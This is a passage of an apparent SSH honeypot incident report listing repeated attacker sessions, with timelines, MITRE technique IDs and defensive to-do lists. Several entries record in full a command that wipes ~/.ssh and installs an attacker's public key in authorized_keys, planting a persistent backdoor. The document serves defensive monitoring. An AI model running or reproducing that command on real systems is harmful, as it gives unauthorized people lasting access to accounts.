| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:16:54` | `cowrie.session.connect` |
| `2026-06-01 22:16:54` | `cowrie.client.version` |
| `2026-06-01 22:16:54` | `cowrie.client.kex` |
| `2026-06-01 22:16:55` | `cowrie.login.success` |
| `2026-06-01 22:16:55` | `cowrie.session.params` |
| `2026-06-01 22:16:55` | `cowrie.command.input` |
| `2026-06-01 22:16:55` | `cowrie.command.failed` |
| `2026-06-01 22:16:55` | `cowrie.log.closed` |
| `2026-06-01 22:16:55` | `cowrie.session.params` |
| `2026-06-01 22:16:55` | `cowrie.command.input` |
| `2026-06-01 22:16:55` | `cowrie.session.file_download` |
| `2026-06-01 22:16:55` | `cowrie.log.closed` |
| `2026-06-01 22:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4437a3945be9

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:16 |
| **Last Seen** | 2026-06-01 22:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:16:56` | `cowrie.session.connect` |
| `2026-06-01 22:16:56` | `cowrie.client.version` |
| `2026-06-01 22:16:56` | `cowrie.client.kex` |
| `2026-06-01 22:16:57` | `cowrie.login.success` |
| `2026-06-01 22:16:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-907c3932bcf7

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:18 |
| **Last Seen** | 2026-06-01 22:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:18:37` | `cowrie.session.connect` |
| `2026-06-01 22:18:37` | `cowrie.client.version` |
| `2026-06-01 22:18:37` | `cowrie.client.kex` |
| `2026-06-01 22:18:38` | `cowrie.login.success` |
| `2026-06-01 22:18:38` | `cowrie.session.params` |
| `2026-06-01 22:18:38` | `cowrie.command.input` |
| `2026-06-01 22:18:38` | `cowrie.command.failed` |
| `2026-06-01 22:18:38` | `cowrie.log.closed` |
| `2026-06-01 22:18:38` | `cowrie.session.params` |
| `2026-06-01 22:18:38` | `cowrie.command.input` |
| `2026-06-01 22:18:38` | `cowrie.session.file_download` |
| `2026-06-01 22:18:38` | `cowrie.log.closed` |
| `2026-06-01 22:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6d93e1b6e0

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:18 |
| **Last Seen** | 2026-06-01 22:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:18:39` | `cowrie.session.connect` |
| `2026-06-01 22:18:39` | `cowrie.client.version` |
| `2026-06-01 22:18:39` | `cowrie.client.kex` |
| `2026-06-01 22:18:40` | `cowrie.login.success` |
| `2026-06-01 22:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-234a7dac70a4

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:25 |
| **Last Seen** | 2026-06-01 22:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:25:24` | `cowrie.session.connect` |
| `2026-06-01 22:25:24` | `cowrie.client.version` |
| `2026-06-01 22:25:25` | `cowrie.client.kex` |
| `2026-06-01 22:25:25` | `cowrie.login.success` |
| `2026-06-01 22:25:25` | `cowrie.session.params` |
| `2026-06-01 22:25:25` | `cowrie.command.input` |
| `2026-06-01 22:25:25` | `cowrie.command.failed` |
| `2026-06-01 22:25:25` | `cowrie.log.closed` |
| `2026-06-01 22:25:25` | `cowrie.session.params` |
| `2026-06-01 22:25:25` | `cowrie.command.input` |
| `2026-06-01 22:25:25` | `cowrie.session.file_download` |
| `2026-06-01 22:25:25` | `cowrie.log.closed` |
| `2026-06-01 22:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87b4e74dd6cc

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:25 |
| **Last Seen** | 2026-06-01 22:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:25:26` | `cowrie.session.connect` |
| `2026-06-01 22:25:26` | `cowrie.client.version` |
| `2026-06-01 22:25:26` | `cowrie.client.kex` |
| `2026-06-01 22:25:27` | `cowrie.login.success` |
| `2026-06-01 22:25:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e90979e176e

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:35 |
| **Last Seen** | 2026-06-01 22:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:35:18` | `cowrie.session.connect` |
| `2026-06-01 22:35:18` | `cowrie.client.version` |
| `2026-06-01 22:35:18` | `cowrie.client.kex` |
| `2026-06-01 22:35:18` | `cowrie.login.success` |
| `2026-06-01 22:35:18` | `cowrie.session.params` |
| `2026-06-01 22:35:18` | `cowrie.command.input` |
| `2026-06-01 22:35:18` | `cowrie.command.failed` |
| `2026-06-01 22:35:18` | `cowrie.log.closed` |
| `2026-06-01 22:35:19` | `cowrie.session.params` |
| `2026-06-01 22:35:19` | `cowrie.command.input` |
| `2026-06-01 22:35:19` | `cowrie.session.file_download` |
| `2026-06-01 22:35:19` | `cowrie.log.closed` |
| `2026-06-01 22:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c5f6e8f635

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:35 |
| **Last Seen** | 2026-06-01 22:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:35:20` | `cowrie.session.connect` |
| `2026-06-01 22:35:20` | `cowrie.client.version` |
| `2026-06-01 22:35:20` | `cowrie.client.kex` |
| `2026-06-01 22:35:20` | `cowrie.login.success` |
| `2026-06-01 22:35:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ef3285ac09

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:37 |
| **Last Seen** | 2026-06-01 22:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:37:03` | `cowrie.session.connect` |
| `2026-06-01 22:37:03` | `cowrie.client.version` |
| `2026-06-01 22:37:03` | `cowrie.client.kex` |
| `2026-06-01 22:37:03` | `cowrie.login.success` |
| `2026-06-01 22:37:03` | `cowrie.session.params` |
| `2026-06-01 22:37:03` | `cowrie.command.input` |
| `2026-06-01 22:37:03` | `cowrie.command.failed` |
| `2026-06-01 22:37:03` | `cowrie.log.closed` |
| `2026-06-01 22:37:03` | `cowrie.session.params` |
| `2026-06-01 22:37:03` | `cowrie.command.input` |
| `2026-06-01 22:37:03` | `cowrie.session.file_download` |
| `2026-06-01 22:37:03` | `cowrie.log.closed` |
| `2026-06-01 22:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-881e9f864c04

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:37 |
| **Last Seen** | 2026-06-01 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:37:05` | `cowrie.session.connect` |
| `2026-06-01 22:37:05` | `cowrie.client.version` |
| `2026-06-01 22:37:05` | `cowrie.client.kex` |
| `2026-06-01 22:37:05` | `cowrie.login.success` |
| `2026-06-01 22:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f07e2507431

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:40 |
| **Last Seen** | 2026-06-01 22:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:40:23` | `cowrie.session.connect` |
| `2026-06-01 22:40:23` | `cowrie.client.version` |
| `2026-06-01 22:40:23` | `cowrie.client.kex` |
| `2026-06-01 22:40:23` | `cowrie.login.success` |
| `2026-06-01 22:40:23` | `cowrie.session.params` |
| `2026-06-01 22:40:23` | `cowrie.command.input` |
| `2026-06-01 22:40:23` | `cowrie.command.failed` |
| `2026-06-01 22:40:23` | `cowrie.log.closed` |
| `2026-06-01 22:40:24` | `cowrie.session.params` |
| `2026-06-01 22:40:24` | `cowrie.command.input` |
| `2026-06-01 22:40:24` | `cowrie.session.file_download` |
| `2026-06-01 22:40:24` | `cowrie.log.closed` |
| `2026-06-01 22:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-417a0bab3642

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:40 |
| **Last Seen** | 2026-06-01 22:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:40:25` | `cowrie.session.connect` |
| `2026-06-01 22:40:25` | `cowrie.client.version` |
| `2026-06-01 22:40:25` | `cowrie.client.kex` |
| `2026-06-01 22:40:25` | `cowrie.login.success` |
| `2026-06-01 22:40:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93478640dc64

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:42 |
| **Last Seen** | 2026-06-01 22:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:42:06` | `cowrie.session.connect` |
| `2026-06-01 22:42:06` | `cowrie.client.version` |
| `2026-06-01 22:42:06` | `cowrie.client.kex` |
| `2026-06-01 22:42:07` | `cowrie.login.success` |
| `2026-06-01 22:42:07` | `cowrie.session.params` |
| `2026-06-01 22:42:07` | `cowrie.command.input` |
| `2026-06-01 22:42:07` | `cowrie.command.failed` |
| `2026-06-01 22:42:07` | `cowrie.log.closed` |
| `2026-06-01 22:42:07` | `cowrie.session.params` |
| `2026-06-01 22:42:07` | `cowrie.command.input` |
| `2026-06-01 22:42:07` | `cowrie.session.file_download` |
| `2026-06-01 22:42:07` | `cowrie.log.closed` |
| `2026-06-01 22:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9d10186b402

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:42 |
| **Last Seen** | 2026-06-01 22:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:42:08` | `cowrie.session.connect` |
| `2026-06-01 22:42:08` | `cowrie.client.version` |
| `2026-06-01 22:42:08` | `cowrie.client.kex` |
| `2026-06-01 22:42:09` | `cowrie.login.success` |
| `2026-06-01 22:42:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d17f9df0ca9

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:43 |
| **Last Seen** | 2026-06-01 22:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:43:47` | `cowrie.session.connect` |
| `2026-06-01 22:43:47` | `cowrie.client.version` |
| `2026-06-01 22:43:47` | `cowrie.client.kex` |
| `2026-06-01 22:43:47` | `cowrie.login.success` |
| `2026-06-01 22:43:48` | `cowrie.session.params` |
| `2026-06-01 22:43:48` | `cowrie.command.input` |
| `2026-06-01 22:43:48` | `cowrie.command.failed` |
| `2026-06-01 22:43:48` | `cowrie.log.closed` |
| `2026-06-01 22:43:48` | `cowrie.session.params` |
| `2026-06-01 22:43:48` | `cowrie.command.input` |
| `2026-06-01 22:43:48` | `cowrie.session.file_download` |
| `2026-06-01 22:43:48` | `cowrie.log.closed` |
| `2026-06-01 22:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca47f54c92c

| Field | Detail |
|---|---|
| **Source IP** | `45.123.217[.]22` |
| **First Seen** | 2026-06-01 22:43 |
| **Last Seen** | 2026-06-01 22:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 22:43:49` | `cowrie.session.connect` |
| `2026-06-01 22:43:49` | `cowrie.client.version` |
| `2026-06-01 22:43:49` | `cowrie.client.kex` |
| `2026-06-01 22:43:49` | `cowrie.login.success` |
| `2026-06-01 22:43:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.123.217[.]22` to AbuseIPDB if not already reported
- [ ] Block `45.123.217[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cb1f3929c87

| Field | Detail |
|---|---|
| **Source IP** | `20.235.225[.]32` |
| **First Seen** | 2026-06-01 23:15 |
| **Last Seen** | 2026-06-01 23:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 23:15:01` | `cowrie.session.connect` |
| `2026-06-01 23:15:01` | `cowrie.client.version` |
| `2026-06-01 23:15:01` | `cowrie.client.kex` |
| `2026-06-01 23:15:01` | `cowrie.login.success` |
| `2026-06-01 23:15:01` | `cowrie.session.params` |
| `2026-06-01 23:15:01` | `cowrie.command.input` |
